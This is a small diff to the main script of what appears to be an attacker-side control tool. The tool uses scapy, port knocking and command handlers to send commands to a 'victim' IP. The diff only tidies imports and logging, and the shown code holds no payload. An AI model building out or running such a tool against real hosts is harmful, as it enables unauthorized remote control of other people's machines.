@@ -1,13 +1,8 @@
 import os
 import subprocess
 
-from enum import StrEnum
-
 from scapy.all import *
-from scapy.layers.inet import IP, TCP
 
-from mods.protocol import send_data, receive_data, receive_packet
-from mods.knocking import send_port_knocks
 from mods.handlers import handle_command
 from mods.shared import OPTIONS_LIST, Cfg, get_ip_address
 
@@ -45,7 +40,7 @@ def _print_menu(logs: str = ''):
         for a in valid_actions:
             print(f'{a} {OPTIONS_LIST[a]}')
 
-        print('\n========== output ==========')
+        print('\n========== Output ==========')
         print(f'{logs}')
         print('============================')
         command = input("\n\t Command: ").strip()
@@ -72,15 +67,13 @@ def main():
     args = build_parser().parse_args()
     my_ip = get_ip_address(args.iface)
 
-    print(f'setting interface to: {args.iface}')
     Cfg.IFACE = args.iface
-    print(f'setting attackerip to: {my_ip}')
     Cfg.ATTACKER_IP = my_ip
-    print(f'setting victimip to: {args.ip}')
     Cfg.VICTIM_IP = args.ip
 
+    print('config: ' + ', '.join('%s: %s' % item for item in vars(Cfg).items() if not item[0].startswith('__')))
+
     run_menu()
-    # show_interfaces()
 
 
 if __name__ == "__main__":
